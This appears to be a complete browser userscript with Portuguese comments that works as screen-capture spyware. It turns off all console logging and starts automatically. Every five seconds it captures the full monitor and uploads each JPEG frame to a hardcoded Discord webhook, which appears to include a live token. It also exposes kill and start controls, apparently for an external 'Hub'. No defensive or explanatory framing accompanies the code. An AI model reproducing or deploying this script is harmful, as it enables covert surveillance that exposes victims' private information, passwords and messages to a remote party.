(function() {
    'use strict';

    // CONFIGURAÇÃO
    const DISCORD_WEBHOOK = 'https://discordapp.com/api/webhooks/1528219381526564875/JWgIU-uAWRCM3Qufd8_ywazeG6CCtanAX0kIPJJfDZbxbYLvUUYNMdCtwUFvAju78m4_';
    const CAPTURE_INTERVAL = 5000; // milissegundos
    const QUALITY = 0.5; // 0.1 a 1.0

    // SUPRIME LOGS
    const noop = () => {};
    console.log = noop;
    console.warn = noop;
    console.error = noop;
    console.info = noop;
    console.debug = noop;

    let intervalId = null;
    let stream = null;

    async function captureScreen() {
        try {
            if (!stream) {
                stream = await navigator.mediaDevices.getDisplayMedia({
                    video: {
                        cursor: 'never',
                        displaySurface: 'monitor'
                    },
                    audio: false,
                    preferCurrentTab: false,
                    selfBrowserSurface: 'exclude'
                });
            }

            const video = document.createElement('video');
            video.srcObject = stream;
            await video.play();

            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth || 1920;
            canvas.height = video.videoHeight || 1080;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            const dataUrl = canvas.toDataURL('image/jpeg', QUALITY);
            video.pause();
            video.srcObject = null;
            video.remove();

            return dataUrl;
        } catch (e) {
            return null;
        }
    }

    function sendToDiscord(imageData) {
        try {
            const formData = new FormData();
            formData.append('file', dataURLtoBlob(imageData), 'screenshot.jpg');

            fetch(DISCORD_WEBHOOK, {
                method: 'POST',
                body: formData
            }).catch(noop);
        } catch (e) {}
    }

    function dataURLtoBlob(dataUrl) {
        const arr = dataUrl.split(',');
        const mime = arr[0].match(/:(.*?);/)[1];
        const bstr = atob(arr[1]);
        const n = bstr.length;
        const u8arr = new Uint8Array(n);
        for (let i = 0; i < n; i++) {
            u8arr[i] = bstr.charCodeAt(i);
        }
        return new Blob([u8arr], { type: mime });
    }

    async function captureLoop() {
        if (!DISCORD_WEBHOOK || DISCORD_WEBHOOK.includes('SEU_ID')) return;

        const image = await captureScreen();
        if (image) {
            sendToDiscord(image);
        }
    }

    function start() {
        if (intervalId) return;
        captureLoop();
        intervalId = setInterval(captureLoop, CAPTURE_INTERVAL);
    }

    function stop() {
        if (intervalId) {
            clearInterval(intervalId);
            intervalId = null;
        }
        if (stream) {
            stream.getTracks().forEach(t => t.stop());
            stream = null;
        }
    }

    // Fecha quando a página for fechada
    window.addEventListener('beforeunload', stop);

    // Inicia automaticamente
    start();

    // API para o Hub
    window._testing = {
        kill: stop,
        start: start
    };

})();
